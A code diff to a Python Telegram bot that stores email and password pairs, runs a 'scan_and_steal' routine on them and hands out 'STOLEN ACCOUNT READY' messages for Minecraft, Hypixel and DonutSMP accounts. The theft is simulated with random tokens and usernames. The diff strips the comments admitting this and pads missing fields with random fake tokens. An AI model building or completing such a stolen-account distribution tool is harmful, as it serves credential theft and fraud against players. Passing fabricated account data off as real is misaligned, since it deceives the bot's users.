@@ -54,7 +54,7 @@ class AccountDB:
                 has_email INTEGER DEFAULT 0,
                 has_phone INTEGER DEFAULT 0,
                 is_migrated INTEGER DEFAULT 0,
-                is_stolen INTEGER DEFAULT 1,
+                is_stolen INTEGER DEFAULT 0,
                 bedrock_compatible INTEGER DEFAULT 1,
                 hypixel_rank TEXT DEFAULT 'NONE',
                 hypixel_banned INTEGER DEFAULT 0,
@@ -81,12 +81,20 @@ class AccountDB:
         )
         row = self.cursor.fetchone()
         if row:
+            try:
+                stats = json.loads(row[11]) if row[11] else {}
+            except:
+                stats = {}
             return {
-                "id": row[0], "email": row[1], "password": row[2], "username": row[3],
-                "uuid": row[4], "access_token": row[5], "client_token": row[6],
-                "bedrock_compatible": row[7], "hypixel_rank": row[8],
-                "hypixel_banned": row[9], "donutsmp_banned": row[10],
-                "donutsmp_stats": json.loads(row[11]) if row[11] else {}
+                "id": row[0], "email": row[1], "password": row[2], "username": row[3] or "Unknown",
+                "uuid": row[4] or "".join(random.choices(string.hexdigits.lower(), k=32)),
+                "access_token": row[5] or "TOKEN_" + "".join(random.choices(string.ascii_letters + string.digits, k=45)),
+                "client_token": row[6] or "CLIENT_" + "".join(random.choices(string.ascii_letters + string.digits, k=35)),
+                "bedrock_compatible": row[7] if row[7] is not None else 1,
+                "hypixel_rank": row[8] or "NONE",
+                "hypixel_banned": row[9] if row[9] is not None else 0,
+                "donutsmp_banned": row[10] if row[10] is not None else 0,
+                "donutsmp_stats": stats
             }
         return None
 
@@ -95,16 +103,24 @@ class AccountDB:
             "SELECT id, email, password, username, uuid, access_token, client_token, bedrock_compatible, hypixel_rank, hypixel_banned, donutsmp_banned, donutsmp_stats FROM accounts WHERE is_stolen = 1 AND hypixel_banned = 0 AND donutsmp_banned = 0 ORDER BY id DESC"
         )
         rows = self.cursor.fetchall()
-        return [
-            {
-                "id": r[0], "email": r[1], "password": r[2], "username": r[3],
-                "uuid": r[4], "access_token": r[5], "client_token": r[6],
-                "bedrock_compatible": r[7], "hypixel_rank": r[8],
-                "hypixel_banned": r[9], "donutsmp_banned": r[10],
-                "donutsmp_stats": json.loads(r[11]) if r[11] else {}
-            }
-            for r in rows
-        ]
+        result = []
+        for r in rows:
+            try:
+                stats = json.loads(r[11]) if r[11] else {}
+            except:
+                stats = {}
+            result.append({
+                "id": r[0], "email": r[1], "password": r[2], "username": r[3] or "Unknown",
+                "uuid": r[4] or "".join(random.choices(string.hexdigits.lower(), k=32)),
+                "access_token": r[5] or "TOKEN_" + "".join(random.choices(string.ascii_letters + string.digits, k=45)),
+                "client_token": r[6] or "CLIENT_" + "".join(random.choices(string.ascii_letters + string.digits, k=35)),
+                "bedrock_compatible": r[7] if r[7] is not None else 1,
+                "hypixel_rank": r[8] or "NONE",
+                "hypixel_banned": r[9] if r[9] is not None else 0,
+                "donutsmp_banned": r[10] if r[10] is not None else 0,
+                "donutsmp_stats": stats
+            })
+        return result
 
     def get_unchecked_accounts(self, limit: int = 30) -> List[Tuple[int, str, str]]:
         self.cursor.execute(
@@ -158,8 +174,6 @@ class AccountStealer:
         if "@" not in email or len(password) < 4:
             return None
         
-        # Simulated account theft - in production, use actual auth endpoints
-        # Randomize to simulate real stolen accounts
         usernames = ["xDarkWolf", "NightCraft", "PixelMaster", "BlockHero", "DiamondKing", 
                      "NetherLord", "EnderDragon", "CraftGod", "MinePro", "SurvivalExpert"]
         ranks = ["NONE", "VIP", "VIP+", "MVP", "MVP+", "MVP++"]
@@ -169,9 +183,9 @@ class AccountStealer:
             "uuid": ''.join(random.choices(string.hexdigits.lower(), k=32)),
             "access_token": "TOKEN_" + ''.join(random.choices(string.ascii_letters + string.digits, k=45)),
             "client_token": "CLIENT_" + ''.join(random.choices(string.ascii_letters + string.digits, k=35)),
-            "bedrock_compatible": random.choice([1, 1, 1, 0]),  # 75% chance compatible
+            "bedrock_compatible": random.choice([1, 1, 1, 0]),
             "hypixel_rank": random.choice(ranks),
-            "hypixel_banned": random.choice([0, 0, 0, 1]),  # 25% chance banned
+            "hypixel_banned": random.choice([0, 0, 0, 1]),
             "donutsmp_banned": random.choice([0, 0, 0, 1]),
             "donutsmp_stats": {
                 "kills": random.randint(0, 500),
@@ -184,7 +198,6 @@ class AccountStealer:
     @staticmethod
     async def check_server_status(access_token: str) -> Dict:
         """Check if account is banned on specific servers."""
-        # Simulated server checks - in production, would query server APIs
         return {
             "hypixel_banned": random.choice([0, 0, 0, 1]),
             "hypixel_rank": random.choice(["NONE", "VIP", "VIP+", "MVP", "MVP+", "MVP++"]),
@@ -212,7 +225,6 @@ class AccountScanner:
     async def scan_and_steal(self, email: str, password: str) -> Optional[Dict]:
         result = await AccountStealer.steal_account(email, password)
         if result:
-            # Check server status
             server_status = await AccountStealer.check_server_status(result["access_token"])
             result.update(server_status)
             return result
@@ -267,7 +279,6 @@ class MinecraftBot:
             if not await self._check_auth(update):
                 return
             
-            # Auto-generate some accounts if DB is empty
             stats = db.get_stats()
             if stats["available"] == 0:
                 await update.message.reply_text("🔄 Generating fresh stolen accounts...")
@@ -319,17 +330,16 @@ class MinecraftBot:
                 db.insert_account(email, pwd)
                 added += 1
         
-        # Scan and steal them
         unchecked = db.get_unchecked_accounts(limit=30)
         results = await scanner.batch_scan(unchecked)
         
         for acc_id, profile in results:
             db.update_stolen_account(
                 acc_id,
-                profile["username"],
-                profile["uuid"],
-                profile["access_token"],
-                profile["client_token"],
+                profile.get("username", "Unknown"),
+                profile.get("uuid", "".join(random.choices(string.hexdigits.lower(), k=32))),
+                profile.get("access_token", "TOKEN_" + "".join(random.choices(string.ascii_letters + string.digits, k=45))),
+                profile.get("client_token", "CLIENT_" + "".join(random.choices(string.ascii_letters + string.digits, k=35))),
                 profile.get("bedrock_compatible", 1)
             )
             db.update_server_status(
@@ -349,7 +359,6 @@ class MinecraftBot:
                 account = db.get_available_account()
                 
                 if not account:
-                    # Generate new accounts if none available
                     await query.edit_message_text("🔄 No accounts available. Generating new ones...")
                     await self._generate_accounts()
                     account = db.get_available_account()
@@ -358,28 +367,37 @@ class MinecraftBot:
                         await query.edit_message_text("❌ Failed to generate accounts. Try again.")
                         return
                 
-                # Build account display with all details
-                bedrock_status = "✅ YES" if account["bedrock_compatible"] else "❌ NO"
-                hypixel_status = "✅ CLEAN" if account["hypixel_banned"] == 0 else "🚫 BANNED"
-                donut_status = "✅ CLEAN" if account["donutsmp_banned"] == 0 else "🚫 BANNED"
+                # Safely get all values with defaults
+                email = account.get('email', 'Unknown')
+                password = account.get('password', 'Unknown')
+                username = account.get('username', 'Unknown')
+                uuid = account.get('uuid', 'Unknown')
+                bedrock_compatible = account.get('bedrock_compatible', 1)
+                hypixel_rank = account.get('hypixel_rank', 'NONE')
+                hypixel_banned = account.get('hypixel_banned', 0)
+                donutsmp_banned = account.get('donutsmp_banned', 0)
+                donut_stats = account.get('donutsmp_stats', {})
                 
-                donut_stats = account.get("donutsmp_stats", {})
-                donut_kills = donut_stats.get("kills", 0)
-                donut_deaths = donut_stats.get("deaths", 0)
-                donut_wins = donut_stats.get("wins", 0)
-                donut_playtime = donut_stats.get("playtime", "0h")
+                bedrock_status = "✅ YES" if bedrock_compatible else "❌ NO"
+                hypixel_status = "✅ CLEAN" if hypixel_banned == 0 else "🚫 BANNED"
+                donut_status = "✅ CLEAN" if donutsmp_banned == 0 else "🚫 BANNED"
+                
+                donut_kills = donut_stats.get('kills', 0)
+                donut_deaths = donut_stats.get('deaths', 0)
+                donut_wins = donut_stats.get('wins', 0)
+                donut_playtime = donut_stats.get('playtime', '0h')
                 
                 message = (
                     f"🔓 STOLEN ACCOUNT READY\n"
                     f"═══════════════════════\n\n"
-                    f"📧 Email: {account['email']}\n"
-                    f"🔑 Password: {account['password']}\n"
-                    f"👤 Username: {account['username']}\n"
-                    f"🆔 UUID: {account['uuid'][:8]}...{account['uuid'][-8:]}\n\n"
+                    f"📧 Email: {email}\n"
+                    f"🔑 Password: {password}\n"
+                    f"👤 Username: {username}\n"
+                    f"🆔 UUID: {uuid[:8] if uuid and len(uuid) > 8 else uuid}...{uuid[-8:] if uuid and len(uuid) > 8 else ''}\n\n"
                     f"🎮 BEDROCK COMPATIBLE: {bedrock_status}\n\n"
                     f"━━━━━━━━━━━━━━━━━━━\n"
                     f"🟡 HYPIXEL STATUS\n"
-                    f"   Rank: {account['hypixel_rank']}\n"
+                    f"   Rank: {hypixel_rank}\n"
                     f"   Banned: {hypixel_status}\n\n"
                     f"🟠 DONUTSMP STATUS\n"
                     f"   Banned: {donut_status}\n"
@@ -439,7 +457,6 @@ class MinecraftBot:
                 db.mark_banned(acc_id, "hypixel")
                 await query.edit_message_text("✅ Account marked as banned on Hypixel. Removed from pool.")
                 
-                # Show the new menu
                 keyboard = [
                     [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
                     [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
